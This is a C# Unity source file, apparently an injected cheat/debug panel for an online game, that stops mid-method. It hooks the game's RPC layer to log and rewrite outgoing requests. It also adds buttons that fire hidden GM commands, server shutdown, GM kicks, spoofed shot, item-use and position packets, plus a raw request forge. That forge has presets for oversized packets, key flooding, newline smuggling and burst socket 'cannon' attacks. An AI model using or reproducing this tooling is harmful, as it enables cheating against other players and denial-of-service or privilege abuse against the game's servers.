// RpcLabUI.cs
// 需要：UnityEngine、Assembly-CSharp（LobbyConnection 等）、UniLua（用于判错）
// 把本文件放进你的工程（比如和 SearchPanel 同目录）

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using UnityEngine;
using UniLua;
using System.Diagnostics;
using ASWDEBUG.Logger;
using System.Text.RegularExpressions;

namespace ASWDEBUG.UI
{
    public static class RpcLabUI
    {
        // ====== 总开关 & 窗口矩形（由外部传入位置尺寸） ======
        public static bool Visible = true;
        private static Rect _winRect;

        // ====== 日志 ======
        private static readonly List<string> _log = new List<string>(512);
        private static readonly object _logLock = new object();
        private static Vector2 _logScroll;
        private static Vector2 _auditScroll;

        // ====== A) 主动测试发送 ======
        private static string _sendFunc = "player_battle_force_get";
        private static readonly List<KV> _sendArgs = new List<KV> { new KV("ccid", "20000000013685949") };

        // ====== B) 全局拦截设置 ======
        public static bool InterceptEnabled = true;
        private static string _interceptFunc = "";                 // 空 = 命中全部
        private static bool _interceptCaseInsensitive = true;
        private static readonly List<KV> _interceptPairs = new List<KV>();

        public static bool LogAllRequests = true;  // 记录所有请求（未命中也记）
        public static bool LogResults = true;      // 记录返回值

        // ====== D) 协议漏洞触发 ======
        private static string _gmCommand = "help";
        private static string _shutdownPassword = "audit";
        private static string _reportType = "1";
        private static string _reportTarget = "0";
        private static string _reportMessage = "audit";
        private static string _reportSize = "0";
        private static string _reportFillByte = "65";
        private static string _roomId = "1";
        private static string _roomPassword = "";
        private static string _roomToken = "0";
        private static string _gmKickUid = "1";
        private static string _voteUid = "1";
        private static string _voteReason = "audit";
        private static bool _voteAgree = true;
        private static string _useIsRealMan = "1";
        private static string _useRobotUid = "0";
        private static string _useSlot = "0";
        private static string _shootIsRealMan = "1";
        private static string _shootRobotUid = "0";
        private static string _shootTargetUid = "0";
        private static string _shootDistance = "0";
        private static string _shootPart = "0";
        private static string _shootSlot = "0";
        private static string _shootEnc = "0";
        private static string _shootSpread = "0";
        private static string _shootSight = "0";
        private static bool _shootDoEffect;
        private static string _pluginUid = "1";
        private static string _pluginType = "4";
        private static bool _pluginCheckOk = true;
        private static string _positionUid = "1";
        private static string _positionSeq = "1";
        private static string _positionTool = "4";
        private static string _syncIsRealMan = "1";
        private static string _syncRobotUid = "0";
        private static string _syncInterval = "255";
        private static string _syncMask = "7";
        private static string _syncStatus = "0";
        private static string _syncOffsetX = "0";
        private static string _syncOffsetY = "0";
        private static string _syncOffsetZ = "0";

        // ====== E) 原始 Text RPC forge ======
        private sealed class RawRequest
        {
            public readonly string Func;
            public readonly string Body;
            public readonly string Note;

            public RawRequest(string func, string body, string note)
            {
                Func = func ?? string.Empty;
                Body = body ?? string.Empty;
                Note = note ?? string.Empty;
            }
        }

        private static string _rawFunc = "player_tutorial_finish";
        private static string _rawBody = "tutorial\n16775544\n";
        private static string _rawRepeatCount = "65536";
        private static string _rawLongFuncSweep = "512,1024,1536,2048,2560,3072,3584,4096";
        private static string _rawSocketBurstCount = "4";
        private static string _rawSocketHoldMs = "2500";
        private static string _rawSocketRecvMs = "1500";
        private static string _rawKeyCount = "128";
        private static string _rawChunkSize = "64";
        private static string _rawRepeatChar = "A";
        private const string RawMarkerKey = "__aswdebug_raw__";
        private static readonly Queue<RawRequest> _rawPendingQueue = new Queue<RawRequest>();
        private static bool _rawArmPending;
        private static global::LobbyConnection.RpcCallback _rawArmCallback;
        private static string _rawArmFunc = string.Empty;
        private static string _rawArmBody = string.Empty;
        private static string _rawArmNote = string.Empty;
        private static string _rawWriteOverrideBody;
        private static string _rawWriteOverrideFunc = string.Empty;
        private static string _rawWriteOverrideNote = string.Empty;
        private static int _rawSocketWorkers;
        private static string _rawInFlightNote = string.Empty;
        private static int _rawInFlightFuncLen;
        private static int _rawInFlightBodyLen;
        private static DateTime _rawInFlightAtUtc = DateTime.MinValue;
        private static bool _rawInFlightTimeoutLogged;
        private const double RawInFlightTimeoutSeconds = 6.0;

        // ====== 给补丁调用：在 AddTextRpc 前调用（ref 允许改实参） ======
        public static void OnBeforeAddTextRpc(object sender,
                                              ref string func,
                                              ref global::LobbyConnection.RpcCallback callback,
                                              ref Dictionary<string, string> argument)
        {
            try
            {
                // NEW: 抓调用者
                var caller = CaptureCaller();

                // 1) 记录请求（带 caller）
                if (LogAllRequests)
                {
                    Append("[REQ] func=" + func + " | caller=" + caller + "\n" + PrettyDictBlock("args", argument));
                }

                // 2) 命中改包？
                bool hit = false;
                if (InterceptEnabled)
                {
                    if (string.IsNullOrEmpty(_interceptFunc)) hit = true;
                    else
                    {
                        var cmp = _interceptCaseInsensitive ? StringComparison.OrdinalIgnoreCase : StringComparison.Ordinal;
                        if (string.Equals(func ?? "", _interceptFunc ?? "", cmp)) hit = true;
                    }
                }

                if (hit)
                {
                    if (argument == null) argument = new Dictionary<string, string>();
                    foreach (var kv in _interceptPairs)
                    {
                        if (!string.IsNullOrEmpty(kv.Key))
                            argument[kv.Key] = kv.Value ?? "";
                    }
                    Append("[REWRITE] func=" + func + "\n" + PrettyDictBlock("newArgs", argument));
                }

                // 3) 包装回调
                var orig = callback;
                var funcNameForLog = func;
                var logResultsLocal = LogResults;
                callback = (string data) =>
                {
                    if (logResultsLocal)
                    {
                        if (IsLuaError(data, out var msg))
                        {
                            Append("[RESULT:ERROR] func=" + funcNameForLog + "\n  error: " + msg);
                        }
                        else
                        {
                            var pretty = TrimForLog(data);
                            Append("[RESULT:OK] func=" + funcNameForLog + "\n" + IndentBlock("data", pretty));
                        }
                    }
                    try { orig?.Invoke(data); } catch { }
                };
            }
            catch (Exception e)
            {
                Append("[ERR] OnBeforeAddTextRpc: " + e);
            }
        }


        // ====== UI ======
        public static void Display(float x, float y, float w, float h)
        {
            TickRawInFlight();
            TryFlushQueuedRawRpc();
            if (!Visible || !CheatUIManager.MenuVisible) return;
            float screenPad = 10f;
            float safeW = Mathf.Min(w, Mathf.Max(420f, Screen.width - screenPad * 2f));
            float safeH = Mathf.Min(h, Mathf.Max(320f, Screen.height - screenPad * 2f));
            float safeX = Mathf.Clamp(x, screenPad, Mathf.Max(screenPad, Screen.width - safeW - screenPad));
            float safeY = Mathf.Clamp(y, screenPad, Mathf.Max(screenPad, Screen.height - safeH - screenPad));
            _winRect = new Rect(safeX, safeY, safeW, safeH);

            // 背板与标题
            UIHeader("RPC 实验室（测试 + 拦截 + 日志）", _winRect);

            // 内边距
            float pad = 8f;
            float cx = _winRect.x + pad;
            float cy = _winRect.y + 24f;
            float cw = _winRect.width - pad * 2f;
            float ch = _winRect.height - 24f - pad;

            // ===== 顶部左右两列 =====
            float colGap = 12f;
            float colW = (cw - colGap) * 0.5f;

            // —— 自适应高度：根据 A/B 参数行数 + 固定头/按钮空间测算 —— //
            float rowH = 24f;
            float blockPad = 12f;    // 内边距
            float headerH = 22f;     // “A) / B)” 标题行
            float labelsH_A = 4f + 18f + 4f + 18f; // A: “函数名”+输入 + “参数”+说明
            float labelsH_B = 18f + 4f + 22f + 4f + 18f; // B: 标题 + 三个 Toggle（大约）

            float buttonBarH_A = 30f;
            float buttonBarH_B = 28f;

            float listH_A = Mathf.Max(0f, _sendArgs.Count * (rowH + 4f));
            float listH_B = Mathf.Max(0f, _interceptPairs.Count * (rowH + 4f));

            // A/B 各自期望高度（内容 + 内边距）
            float wantH_A = blockPad + headerH + labelsH_A + listH_A + buttonBarH_A + blockPad;
            float wantH_B = blockPad + headerH + labelsH_B + listH_B + buttonBarH_B + blockPad;

            // 默认最小高度（比之前更高）
            float minColH = Mathf.Clamp(Screen.height * 0.24f, 220f, 320f);
            float colH_A = Mathf.Max(minColH, wantH_A);
            float colH_B = Mathf.Max(minColH, wantH_B);

            // 顶部两列统一使用较高的那一个，便于对齐
            float colH = Mathf.Max(colH_A, colH_B);

            // ----- 左列：主动测试 -----
            DrawBox(new Rect(cx, cy, colW, colH));
            GUILayout.BeginArea(new Rect(cx + 6, cy + 6, colW - 12, colH - 12));
            GUILayout.Label("A) 发送自定义 RPC", LabelBold());

            GUILayout.Space(4);
            GUILayout.Label("函数名");
            _sendFunc = GUILayout.TextField(_sendFunc ?? "", TextField());

            GUILayout.Space(4);
            GUILayout.Label("参数（可变行）");
            DrawKvList(_sendArgs);
            GUILayout.Space(2);
            GUILayout.BeginHorizontal();
            if (GUILayout.Button("+ 添加参数", Button(), GUILayout.Height(22))) _sendArgs.Add(new KV());
            if (GUILayout.Button("清空参数", Button(), GUILayout.Height(22))) _sendArgs.Clear();
            GUILayout.FlexibleSpace();
            if (GUILayout.Button("发送", ButtonPrimary(), GUILayout.Height(26), GUILayout.Width(90)))
                TrySendRpc();
            GUILayout.EndHorizontal();
            GUILayout.EndArea();

            // ----- 右列：拦截设置 -----
            float rx = cx + colW + colGap;
            DrawBox(new Rect(rx, cy, colW, colH));
            GUILayout.BeginArea(new Rect(rx + 6, cy + 6, colW - 12, colH - 12));
            GUILayout.Label("B) 全局拦截设置", LabelBold());

            InterceptEnabled = GUILayout.Toggle(InterceptEnabled, "启用拦截（命中则改包）");
            LogAllRequests = GUILayout.Toggle(LogAllRequests, "记录所有请求（未命中也记）");
            LogResults = GUILayout.Toggle(LogResults, "记录返回值");

            GUILayout.Space(4);
            GUILayout.BeginHorizontal();
            GUILayout.Label("函数名匹配（空=全部）", GUILayout.Width(140));
            _interceptFunc = GUILayout.TextField(_interceptFunc ?? "", TextField());
            GUILayout.EndHorizontal();
            _interceptCaseInsensitive = GUILayout.Toggle(_interceptCaseInsensitive, "大小写不敏感");

            GUILayout.Space(4);
            GUILayout.Label("命中时替换/插入这些参数：");
            DrawKvList(_interceptPairs);
            GUILayout.Space(2);
            GUILayout.BeginHorizontal();
            if (GUILayout.Button("+ 添加", Button(), GUILayout.Height(22))) _interceptPairs.Add(new KV());
            if (GUILayout.Button("清空", Button(), GUILayout.Height(22))) _interceptPairs.Clear();
            GUILayout.FlexibleSpace();
            GUILayout.EndHorizontal();
            GUILayout.EndArea();

            // ===== 中部：漏洞触发区 =====
            float auditTop = cy + colH + 10f;
            float auditH = Mathf.Max(180f, Mathf.Min(340f, ch * 0.42f));
            DrawBox(new Rect(cx, auditTop, cw, auditH));
            GUILayout.BeginArea(new Rect(cx + 6, auditTop + 6, cw - 12, auditH - 12));
            DrawAuditPanel();
            GUILayout.EndArea();

            // ===== 底部：大日志区 =====
            float logTop = auditTop + auditH + 10f;
            float logH = Mathf.Max(60f, ch - colH - auditH - 20f);
            DrawBox(new Rect(cx, logTop, cw, logH));
            GUILayout.BeginArea(new Rect(cx + 6, logTop + 6, cw - 12, logH - 12));
            GUILayout.BeginHorizontal();
            GUILayout.Label("C) 实时日志", LabelBold());
            GUILayout.FlexibleSpace();
            if (GUILayout.Button("Clear", Button(), GUILayout.Width(80))) _log.Clear();
            GUILayout.EndHorizontal();

            GUILayout.Space(4);
            _logScroll = GUILayout.BeginScrollView(_logScroll, GUILayout.ExpandHeight(true));
            string[] snapshot;
            lock (_logLock)
            {
                snapshot = _log.ToArray();
            }
            string joined = (snapshot.Length == 0) ? "(无输出)" : string.Join("\n", snapshot);
            GUILayout.TextArea(joined, TextArea(), GUILayout.ExpandHeight(true));
            GUILayout.EndScrollView();
            GUILayout.EndArea();
        }

        // ====== 对外：追加日志 ======
        public static void Append(string line)
        {
            if (string.IsNullOrEmpty(line)) return;
            lock (_logLock)
            {
                if (_log.Count > 8000) _log.RemoveRange(0, 4000);
                _log.Add("[" + DateTime.Now.ToString("HH:mm:ss.fff") + "] " + line);
            }
        }

        // ====== A) 发送调用 ======
        public static void TrySendRpc()
        {
            try
            {
                var conn = global::GameApp.Instance?.lobby_connection;
                if (conn == null) { Append("[SEND] 失败：lobby_connection 为 null"); return; }

                var func = _sendFunc ?? "";
                var dict = _sendArgs
                    .Where(kv => !string.IsNullOrEmpty(kv.Key))
                    .GroupBy(kv => kv.Key)
                    .ToDictionary(g => g.Key, g => g.Last().Value ?? "");

                Append("[SEND] func=" + func + "\n" + PrettyDictBlock("args", dict));
                conn.AddTextRpc(func, new global::LobbyConnection.RpcCallback(OnSendResult), dict);
            }
            catch (Exception e)
            {
                Append("[SEND] 异常: " + e);
            }
        }

        private static void OnSendResult(string data)
        {
            if (IsLuaError(data, out var msg))
            {
                Append("[SEND RESULT:ERROR]\n  error: " + msg);
            }
            else
            {
                var pretty = TrimForLog(data);
                Append("[SEND RESULT:OK]\n" + IndentBlock("data", pretty));
            }
        }

        public static void OnBeginTextRpc(string func, global::LobbyConnection.RpcCallback callback)
        {
            try
            {
                if (!_rawArmPending || _rawArmCallback == null)
                {
                    return;
                }
                if (!object.Equals(callback, _rawArmCallback))
                {
                    return;
                }
                if (!string.Equals(func ?? string.Empty, _rawArmFunc ?? string.Empty, StringComparison.Ordinal))
                {
                    return;
                }

                _rawWriteOverrideBody = _rawArmBody ?? string.Empty;
                _rawWriteOverrideFunc = func ?? string.Empty;
                _rawWriteOverrideNote = _rawArmNote ?? string.Empty;
                _rawArmPending = false;
                _rawArmCallback = null;
                _rawArmFunc = string.Empty;
                _rawArmBody = string.Empty;
                _rawArmNote = string.Empty;
                Append("[RAW:ARM] note=" + _rawWriteOverrideNote + " funcLen=" + _rawWriteOverrideFunc.Length + " bodyLen=" + _rawWriteOverrideBody.Length);
            }
            catch (Exception e)
            {
                Append("[RAW:ARM] 异常: " + e);
            }
        }

        public static void OnBeforeWriteCompressString(ref string str)
        {
            try
            {
                if (_rawWriteOverrideBody == null)
                {
                    return;
                }
                str = _rawWriteOverrideBody;
                Append("[RAW:SEND] note=" + _rawWriteOverrideNote + " funcLen=" + ((_rawWriteOverrideFunc == null) ? 0 : _rawWriteOverrideFunc.Length) + " bodyLen=" + str.Length + "\n" + IndentBlock("body", TrimForLog(str)));
                _rawWriteOverrideBody = null;
                _rawWriteOverrideFunc = string.Empty;
                _rawWriteOverrideNote = string.Empty;
            }
            catch (Exception e)
            {
                Append("[RAW:SEND] 覆盖失败: " + e);
            }
        }

        private static void DrawAuditPanel()
        {
            GUILayout.Label("D) 协议漏洞触发", LabelBold());
            GUILayout.Label("只打网络/协议入口，按钮按下后会把参数与结果记入日志。", LabelDim());
            GUILayout.Space(4);

            _auditScroll = GUILayout.BeginScrollView(_auditScroll, GUILayout.ExpandHeight(true));

            GUILayout.Label("隐藏接口 / 鉴权面", LabelBold());
            GUILayout.BeginHorizontal();
            GUILayout.Label("GM", GUILayout.Width(30));
            _gmCommand = GUILayout.TextField(_gmCommand ?? "", TextField(), GUILayout.ExpandWidth(true));
            if (GUILayout.Button("GMCommand", ButtonPrimary(), GUILayout.Width(100))) TriggerGMCommand();
            GUILayout.EndHorizontal();
            GUILayout.BeginHorizontal();
            GUILayout.Label("PWD", GUILayout.Width(30));
            _shutdownPassword = GUILayout.TextField(_shutdownPassword ?? "", TextField(), GUILayout.ExpandWidth(true));
            if (GUILayout.Button("Shutdown", ButtonPrimary(), GUILayout.Width(90))) TriggerShutdown();
            if (GUILayout.Button("TX is_login", Button(), GUILayout.Width(90))) TriggerTencentIsLogin();
            GUILayout.EndHorizontal();

            GUILayout.Space(8);
            GUILayout.Label("举报 / 反作弊回报", LabelBold());
            GUILayout.BeginHorizontal();
            GUILayout.Label("type", GUILayout.Width(34));
            _reportType = GUILayout.TextField(_reportType ?? "", TextField(), GUILayout.Width(44));
            GUILayout.Label("target", GUILayout.Width(40));
            _reportTarget = GUILayout.TextField(_reportTarget ?? "", TextField(), GUILayout.Width(90));
            GUILayout.Label("size", GUILayout.Width(28));
            _reportSize = GUILayout.TextField(_reportSize ?? "", TextField(), GUILayout.Width(56));
            GUILayout.Label("fill", GUILayout.Width(24));
            _reportFillByte = GUILayout.TextField(_reportFillByte ?? "", TextField(), GUILayout.Width(56));
            if (GUILayout.Button("Report", ButtonPrimary(), GUILayout.Width(90))) TriggerReport();
            GUILayout.EndHorizontal();
            _reportMessage = GUILayout.TextField(_reportMessage ?? "", TextArea(), GUILayout.Height(44), GUILayout.ExpandWidth(true));
            GUILayout.BeginHorizontal();
            GUILayout.Label("plugin uid", GUILayout.Width(62));
            _pluginUid = GUILayout.TextField(_pluginUid ?? "", TextField(), GUILayout.Width(50));
            GUILayout.Label("tool", GUILayout.Width(30));
            _pluginType = GUILayout.TextField(_pluginType ?? "", TextField(), GUILayout.Width(50));
            _pluginCheckOk = GUILayout.Toggle(_pluginCheckOk, "check_ok");
            if (GUILayout.Button("PluginReport", Button(), GUILayout.Width(100))) TriggerPluginReport();
            GUILayout.FlexibleSpace();
            GUILayout.EndHorizontal();
            GUILayout.BeginHorizontal();
            GUILayout.Label("pos uid", GUILayout.Width(52));
            _positionUid = GUILayout.TextField(_positionUid ?? "", TextField(), GUILayout.Width(50));
            GUILayout.Label("seq", GUILayout.Width(24));
            _positionSeq = GUILayout.TextField(_positionSeq ?? "", TextField(), GUILayout.Width(70));
            GUILayout.Label("tool", GUILayout.Width(30));
            _positionTool = GUILayout.TextField(_positionTool ?? "", TextField(), GUILayout.Width(50));
            if (GUILayout.Button("Send 170", Button(), GUILayout.Width(90))) TriggerPositionCheck();
            GUILayout.FlexibleSpace();
            GUILayout.EndHorizontal();

            GUILayout.Space(8);
            GUILayout.Label("房间 / 权限 / 场景限制", LabelBold());
            GUILayout.BeginHorizontal();
            GUILayout.Label("room", GUILayout.Width(36));
            _roomId = GUILayout.TextField(_roomId ?? "", TextField(), GUILayout.Width(60));
            GUILayout.Label("pwd", GUILayout.Width(26));
            _roomPassword = GUILayout.TextField(_roomPassword ?? "", TextField(), GUILayout.Width(110));
            GUILayout.Label("token", GUILayout.Width(36));
            _roomToken = GUILayout.TextField(_roomToken ?? "", TextField(), GUILayout.Width(84));
            if (GUILayout.Button("RoomEnter", ButtonPrimary(), GUILayout.Width(92))) TriggerRoomEnter();
            GUILayout.EndHorizontal();
            GUILayout.BeginHorizontal();
            GUILayout.Label("kick uid", GUILayout.Width(56));
            _gmKickUid = GUILayout.TextField(_gmKickUid ?? "", TextField(), GUILayout.Width(52));
            if (GUILayout.Button("GMKick", Button(), GUILayout.Width(80))) TriggerGMKick();
            GUILayout.Space(12);
            GUILayout.Label("vote uid", GUILayout.Width(56));
            _voteUid = GUILayout.TextField(_voteUid ?? "", TextField(), GUILayout.Width(52));
            GUILayout.Label("reason", GUILayout.Width(44));
            _voteReason = GUILayout.TextField(_voteReason ?? "", TextField(), GUILayout.Width(170));
            if (GUILayout.Button("VoteBegin", Button(), GUILayout.Width(90))) TriggerVoteBegin();
            _voteAgree = GUILayout.Toggle(_voteAgree, "agree");
            if (GUILayout.Button("Vote", Button(), GUILayout.Width(70))) TriggerVote();
            GUILayout.EndHorizontal();
            GUILayout.BeginHorizontal();
            if (GUILayout.Button("GameStart", Button(), GUILayout.Width(90))) TriggerGameStart();
            if (GUILayout.Button("GameEnter", Button(), GUILayout.Width(90))) TriggerGameEnter();
            if (GUILayout.Button("Revive", Button(), GUILayout.Width(90))) TriggerRevive();
            GUILayout.FlexibleSpace();
            GUILayout.EndHorizontal();

            GUILayout.Space(8);
            GUILayout.Label("客户端权威字段", LabelBold());
            GUILayout.BeginHorizontal();
            GUILayout.Label("use real", GUILayout.Width(54));
            _useIsRealMan = GUILayout.TextField(_useIsRealMan ?? "", TextField(), GUILayout.Width(42));
            GUILayout.Label("robot", GUILayout.Width(36));
            _useRobotUid = GUILayout.TextField(_useRobotUid ?? "", TextField(), GUILayout.Width(66));
            GUILayout.Label("slot", GUILayout.Width(24));
            _useSlot = GUILayout.TextField(_useSlot ?? "", TextField(), GUILayout.Width(42));
            if (GUILayout.Button("Use(136)", ButtonPrimary(), GUILayout.Width(92))) TriggerUseSpoof();
            GUILayout.FlexibleSpace();
            GUILayout.EndHorizontal();
            GUILayout.BeginHorizontal();
            GUILayout.Label("hit uid", GUILayout.Width(46));
            _shootTargetUid = GUILayout.TextField(_shootTargetUid ?? "", TextField(), GUILayout.Width(50));
            GUILayout.Label("dist", GUILayout.Width(28));
            _shootDistance = GUILayout.TextField(_shootDistance ?? "", TextField(), GUILayout.Width(50));
            GUILayout.Label("part", GUILayout.Width(28));
            _shootPart = GUILayout.TextField(_shootPart ?? "", TextField(), GUILayout.Width(42));
            GUILayout.Label("slot", GUILayout.Width(24));
            _shootSlot = GUILayout.TextField(_shootSlot ?? "", TextField(), GUILayout.Width(42));
            GUILayout.Label("enc", GUILayout.Width(24));
            _shootEnc = GUILayout.TextField(_shootEnc ?? "", TextField(), GUILayout.Width(50));
            GUILayout.Label("spread", GUILayout.Width(42));
            _shootSpread = GUILayout.TextField(_shootSpread ?? "", TextField(), GUILayout.Width(58));
            GUILayout.EndHorizontal();
            GUILayout.BeginHorizontal();
            GUILayout.Label("real", GUILayout.Width(32));
            _shootIsRealMan = GUILayout.TextField(_shootIsRealMan ?? "", TextField(), GUILayout.Width(42));
            GUILayout.Label("robot", GUILayout.Width(36));
            _shootRobotUid = GUILayout.TextField(_shootRobotUid ?? "", TextField(), GUILayout.Width(66));
            GUILayout.Label("sight", GUILayout.Width(36));
            _shootSight = GUILayout.TextField(_shootSight ?? "", TextField(), GUILayout.Width(42));
            _shootDoEffect = GUILayout.Toggle(_shootDoEffect, "do_effect");
            if (GUILayout.Button("Shoot(106)", ButtonPrimary(), GUILayout.Width(92))) TriggerShootSpoof();
            GUILayout.FlexibleSpace();
            GUILayout.EndHorizontal();
            GUILayout.BeginHorizontal();
            GUILayout.Label("105 real", GUILayout.Width(56));
            _syncIsRealMan = GUILayout.TextField(_syncIsRealMan ?? "", TextField(), GUILayout.Width(42));
            GUILayout.Label("robot", GUILayout.Width(36));
            _syncRobotUid = GUILayout.TextField(_syncRobotUid ?? "", TextField(), GUILayout.Width(66));
            GUILayout.Label("dt", GUILayout.Width(18));
            _syncInterval = GUILayout.TextField(_syncInterval ?? "", TextField(), GUILayout.Width(42));
            GUILayout.Label("mask", GUILayout.Width(30));
            _syncMask = GUILayout.TextField(_syncMask ?? "", TextField(), GUILayout.Width(42));
            GUILayout.Label("status", GUILayout.Width(40));
            _syncStatus = GUILayout.TextField(_syncStatus ?? "", TextField(), GUILayout.Width(42));
            GUILayout.EndHorizontal();
            GUILayout.BeginHorizontal();
            GUILayout.Label("offset x/y/z", GUILayout.Width(72));
            _syncOffsetX = GUILayout.TextField(_syncOffsetX ?? "", TextField(), GUILayout.Width(52));
            _syncOffsetY = GUILayout.TextField(_syncOffsetY ?? "", TextField(), GUILayout.Width(52));
            _syncOffsetZ = GUILayout.TextField(_syncOffsetZ ?? "", TextField(), GUILayout.Width(52));
            if (GUILayout.Button("Sync105", ButtonPrimary(), GUILayout.Width(92))) TriggerSyncSpoof();
            GUILayout.FlexibleSpace();
            GUILayout.EndHorizontal();

            GUILayout.Space(8);
            GUILayout.Label("原始 Text RPC Forge", LabelBold());
            GUILayout.Label("不走 Dictionary 去重，直接发送压缩前原始 body。适合继续打长包、键洪泛、换行走私。", LabelDim());
            GUILayout.BeginHorizontal();
            GUILayout.Label("func", GUILayout.Width(34));
            _rawFunc = GUILayout.TextField(_rawFunc ?? "", TextField(), GUILayout.ExpandWidth(true));
            if (GUILayout.Button("排队发送", ButtonPrimary(), GUILayout.Width(92))) QueueRawTextRpc(_rawFunc, _rawBody, "manual");
            GUILayout.EndHorizontal();
            _rawBody = GUILayout.TextArea(_rawBody ?? "", TextArea(), GUILayout.Height(78), GUILayout.ExpandWidth(true));
            GUILayout.BeginHorizontal();
            GUILayout.Label("repeat", GUILayout.Width(42));
            _rawRepeatCount = GUILayout.TextField(_rawRepeatCount ?? "", TextField(), GUILayout.Width(78));
            GUILayout.Label("sweep", GUILayout.Width(38));
            _rawLongFuncSweep = GUILayout.TextField(_rawLongFuncSweep ?? "", TextField(), GUILayout.Width(220));
            GUILayout.Label("keys", GUILayout.Width(30));
            _rawKeyCount = GUILayout.TextField(_rawKeyCount ?? "", TextField(), GUILayout.Width(62));
            GUILayout.Label("chunk", GUILayout.Width(38));
            _rawChunkSize = GUILayout.TextField(_rawChunkSize ?? "", TextField(), GUILayout.Width(62));
            GUILayout.Label("char", GUILayout.Width(28));
            _rawRepeatChar = GUILayout.TextField(_rawRepeatChar ?? "", TextField(), GUILayout.Width(42));
            GUILayout.FlexibleSpace();
            GUILayout.EndHorizontal();
            GUILayout.BeginHorizontal();
            GUILayout.Label("burst", GUILayout.Width(38));
            _rawSocketBurstCount = GUILayout.TextField(_rawSocketBurstCount ?? "", TextField(), GUILayout.Width(54));
            GUILayout.Label("hold", GUILayout.Width(30));
            _rawSocketHoldMs = GUILayout.TextField(_rawSocketHoldMs ?? "", TextField(), GUILayout.Width(62));
            GUILayout.Label("recv", GUILayout.Width(30));
            _rawSocketRecvMs = GUILayout.TextField(_rawSocketRecvMs ?? "", TextField(), GUILayout.Width(62));
            GUILayout.Label("workers=" + _rawSocketWorkers, LabelDim(), GUILayout.Width(90));
            GUILayout.FlexibleSpace();
            GUILayout.EndHorizontal();
            GUILayout.BeginHorizontal();
            if (GUILayout.Button("教程-高压缩", Button(), GUILayout.Width(96))) QueuePresetTutorialCompression();
            if (GUILayout.Button("教程-多键洪泛", Button(), GUILayout.Width(108))) QueuePresetTutorialKeyFlood();
            if (GUILayout.Button("教程-换行走私", Button(), GUILayout.Width(108))) QueuePresetTutorialSmuggle();
            if (GUILayout.Button("Func单发", Button(), GUILayout.Width(84))) QueuePresetLongFunc();
            if (GUILayout.Button("Func楼梯", ButtonPrimary(), GUILayout.Width(84))) QueuePresetLongFuncSweep();
            if (GUILayout.Button("Func炮台", ButtonPrimary(), GUILayout.Width(84))) TriggerLongFuncSocketCannon();
            if (GUILayout.Button("清空Raw", Button(), GUILayout.Width(84)))
            {
                _rawFunc = string.Empty;
                _rawBody = string.Empty;
            }
            GUILayout.FlexibleSpace();
            GUILayout.EndHorizontal();

            GUILayout.EndScrollView();
        }

        private static void TriggerGMCommand()
        {
            try
            {
                var conn = GetLobbyConnection();
                if (conn == null) return;
                Append("[AUDIT] ReqeustGMCommand cmd=" + (_gmCommand ?? ""));
                conn.ReqeustGMCommand(_gmCommand ?? "");
            }
            catch (Exception e)
            {
                Append("[AUDIT] GM send failed: " + e);
            }
        }

        private static void TriggerShutdown()
        {
            try
            {
                var conn = GetLobbyConnection();
                if (conn == null) return;
                Append("[AUDIT] RequestShutdown passwordLen=" + ((_shutdownPassword == null) ? 0 : _shutdownPassword.Length));
                conn.RequestShutdown(_shutdownPassword ?? "");
            }
            catch (Exception e)
            {
                Append("[AUDIT] Shutdown send failed: " + e);
            }
        }

        private static void TriggerTencentIsLogin()
        {
            try
            {
                var conn = GetLobbyConnection();
                if (conn == null) return;
                Append("[AUDIT] RequestTengxunZhuanFa api=is_login");
                conn.RequestTengxunZhuanFa(global::LobbyConnection.TengxunApi.is_login);
            }
            catch (Exception e)
            {
                Append("[AUDIT] Tengxun send failed: " + e);
            }
        }

        private static void TriggerReport()
        {
            try
            {
                var conn = GetLobbyConnection();
                if (conn == null) return;
                int size = ParseInt(_reportSize, 0);
                byte fill = ParseByte(_reportFillByte, 65);
                byte[] data = BuildBlob(size, fill);
                byte reportType = ParseByte(_reportType, 1);
                Append("[AUDIT] RequestReport type=" + reportType + " target=" + (_reportTarget ?? "") + " size=" + size + " messageLen=" + ((_reportMessage == null) ? 0 : _reportMessage.Length));
                conn.RequestReport(reportType, _reportTarget ?? "", _reportMessage ?? "", size, data);
            }
            catch (Exception e)
            {
                Append("[AUDIT] Report send failed: " + e);
            }
        }

        private static void TriggerRoomEnter()
        {
            try
            {
                var conn = GetChannelConnection();
                if (conn == null) return;
                int roomId = ParseInt(_roomId, 0);
                uint token = ParseUInt(_roomToken, 0U);
                Append("[AUDIT] RequestRoomEnter roomId=" + roomId + " token=" + token + " passwordLen=" + ((_roomPassword == null) ? 0 : _roomPassword.Length));
                conn.RequestRoomEnter(roomId, _roomPassword ?? "", token);
            }
            catch (Exception e)
            {
                Append("[AUDIT] RoomEnter failed: " + e);
            }
        }

        private static void TriggerGMKick()
        {
            try
            {
                var conn = GetChannelConnection();
                if (conn == null) return;
                byte uid = ParseByte(_gmKickUid, 1);
                Append("[AUDIT] RequestGMKickClient uid=" + uid);
                conn.RequestGMKickClient(uid);
            }
            catch (Exception e)
            {
                Append("[AUDIT] GMKick failed: " + e);
            }
        }

        private static void TriggerVoteBegin()
        {
            try
            {
                var conn = GetChannelConnection();
                if (conn == null) return;
                byte uid = ParseByte(_voteUid, 1);
                Append("[AUDIT] RequestVoteBegin uid=" + uid + " reason=" + (_voteReason ?? ""));
                conn.RequestVoteBegin(uid, _voteReason ?? "");
            }
            catch (Exception e)
            {
                Append("[AUDIT] VoteBegin failed: " + e);
            }
        }

        private static void TriggerVote()
        {
            try
            {
                var conn = GetChannelConnection();
                if (conn == null) return;
                Append("[AUDIT] RequestVote agree=" + _voteAgree);
                conn.RequestVote(_voteAgree);
            }
            catch (Exception e)
            {
                Append("[AUDIT] Vote failed: " + e);
            }
        }

        private static void TriggerGameStart()
        {
            try
            {
                var conn = GetChannelConnection();
                if (conn == null) return;
                Append("[AUDIT] RequestGameStart");
                conn.RequestGameStart();
            }
            catch (Exception e)
            {
                Append("[AUDIT] GameStart failed: " + e);
            }
        }

        private static void TriggerGameEnter()
        {
            try
            {
                var conn = GetChannelConnection();
                if (conn == null) return;
                Append("[AUDIT] RequestGameEnter");
                conn.RequestGameEnter();
            }
            catch (Exception e)
            {
                Append("[AUDIT] GameEnter failed: " + e);
            }
        }

        private static void TriggerRevive()
        {
            try
            {
                var conn = GetChannelConnection();
                if (conn == null) return;
                Append("[AUDIT] RequestRevive");
                conn.RequestRevive();
            }
            catch (Exception e)
            {
                Append("[AUDIT] Revive failed: " + e);
            }
        }

        private static void TriggerUseSpoof()
